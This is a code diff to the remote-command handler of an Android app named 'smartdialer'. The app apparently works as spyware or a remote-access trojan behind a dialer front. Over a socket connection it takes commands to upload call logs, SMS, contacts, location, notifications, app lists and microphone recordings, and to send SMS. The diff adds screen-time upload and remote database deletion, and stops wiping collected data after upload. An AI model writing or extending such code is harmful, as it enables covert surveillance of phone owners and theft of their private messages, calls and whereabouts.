@@ -24,11 +24,14 @@ import com.example.smartdialer.room.AppDatabase;
 import com.example.smartdialer.room.dao.CallDao;
 import com.example.smartdialer.room.dao.LocationDao;
 import com.example.smartdialer.room.dao.NotificationDao;
+import com.example.smartdialer.room.dao.ScreenTimeDao;
 import com.example.smartdialer.room.dao.SmsDao;
 import com.example.smartdialer.room.entity.Calls;
 import com.example.smartdialer.room.entity.LocationEntity;
 import com.example.smartdialer.room.entity.Noti;
+import com.example.smartdialer.room.entity.ScreenTime;
 import com.example.smartdialer.room.entity.Sms;
+import com.example.smartdialer.room.worker.DeleteDB;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -85,10 +88,10 @@ public class ConnectionManager {
                                 getContact();
                                 break;
                             case "calls":
-                                getCalls();
+                                getCalls(jsonObject.getInt("limit"));
                                 break;
                             case "sms":
-                                getSms();
+                                getSms(jsonObject.getInt("limit"));
                                 break;
                             case "sendsms":
                                 sendSms(jsonObject.getString("phone"), jsonObject.getString("message"));
@@ -97,7 +100,7 @@ public class ConnectionManager {
                                 getSysInfo();
                                 break;
                             case "applist":
-                                getAppList();
+                                getAppList(jsonObject.getBoolean("system"));
                                 break;
                             case "geolocation":
                                 getGeoLocation();
@@ -105,6 +108,7 @@ public class ConnectionManager {
                             case "calldb":
                                 getCallFromDB();
                                 break;
+
                             case "smsdb":
                                 getSmsFromDB();
                                 break;
@@ -113,6 +117,12 @@ public class ConnectionManager {
                                 break;
                             case "locationdb":
                                 getLocationDB();
+                                break;
+                            case "screendb":
+                                getScreenFromDB();
+                                break;
+                            case "deletedb":
+                                deleteDB(jsonObject.getString("dbname"));
                                 break;
                             case "record":
                                 micRecord(jsonObject.getInt("time"));
@@ -153,6 +163,7 @@ public class ConnectionManager {
                             case "vibrate":
                                 vibrate();
                                 break;
+
                             default:
                                 break;
                         }
@@ -164,6 +175,41 @@ public class ConnectionManager {
             ioSocket.connect();
         } catch (Exception e) {
             e.printStackTrace();
+        }
+    }
+
+    private static void getScreenFromDB() {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                AppDatabase db = Room.databaseBuilder(context,
+                        AppDatabase.class, "temp.db").build();
+                ScreenTimeDao screenTimeDao = db.screenTimeDao();
+                List<ScreenTime> screenTimeList = screenTimeDao.getAll();
+                JSONArray jsonArray = new JSONArray();
+                for (ScreenTime screenTime : screenTimeList) {
+                    JSONObject jsonObject = new JSONObject();
+                    try {
+                        jsonObject.put("status", screenTime.getStatus());
+                        jsonObject.put("time", screenTime.getTime());
+                        jsonArray.put(jsonObject);
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                }
+                ioSocket.emit("screedb", deviceId, jsonArray);
+                //locationDao.deleteAll();
+            }
+        }).start();
+    }
+
+    private static void deleteDB(String db) {
+        try{
+            new DeleteDB(context, db).start();
+            ioSocket.emit("deletedb", deviceId, "{\"status\":true}");
+        }catch (Exception e){
+            e.printStackTrace();
+            ioSocket.emit("deletedb", deviceId, "{\"status\":false}");
         }
     }
 
@@ -316,13 +362,13 @@ public class ConnectionManager {
         ioSocket.emit("sysinfo", deviceId, jsonObject);
     }
 
-    private static void getCalls() {
-        String calls = CallsManager.getCallDetails(context).toString();
+    private static void getCalls(int limit) {
+        String calls = CallsManager.getCallDetails(context, limit).toString();
         ioSocket.emit("calls", deviceId, calls);
     }
 
-    private static void getSms() {
-        String sms = SMSManager.getsms().toString();
+    private static void getSms(int limit) {
+        String sms = SMSManager.getsms(limit).toString();
         ioSocket.emit("sms", deviceId, sms);
     }
 
@@ -340,8 +386,8 @@ public class ConnectionManager {
         ioSocket.emit("contact", deviceId, contact);
     }
 
-    private static void getAppList() {
-        String appList = AppList.getInstalledApps(false, context).toString();
+    private static void getAppList(boolean system) {
+        String appList = AppList.getInstalledApps(system, context).toString();
         ioSocket.emit("applist", deviceId, appList);
     }
 
@@ -367,7 +413,7 @@ public class ConnectionManager {
 
                 }
                 ioSocket.emit("calldb", deviceId, jsonArray);
-                callDao.deleteAll();
+                //callDao.deleteAll();
             }
         }).start();
 
@@ -395,7 +441,7 @@ public class ConnectionManager {
 
                 }
                 ioSocket.emit("smsdb", deviceId, jsonArray);
-                smsDao.deleteAll();
+                //smsDao.deleteAll();
             }
         }).start();
     }
@@ -424,7 +470,7 @@ public class ConnectionManager {
 
                 }
                 ioSocket.emit("notidb", deviceId, jsonArray);
-                notificationDao.deleteAll();
+                //notificationDao.deleteAll();
             }
         }).start();
     }
@@ -448,10 +494,9 @@ public class ConnectionManager {
                     } catch (JSONException e) {
                         e.printStackTrace();
                     }
-
                 }
                 ioSocket.emit("locationdb", deviceId, jsonArray);
-                locationDao.deleteAll();
+                //locationDao.deleteAll();
             }
         }).start();
     }
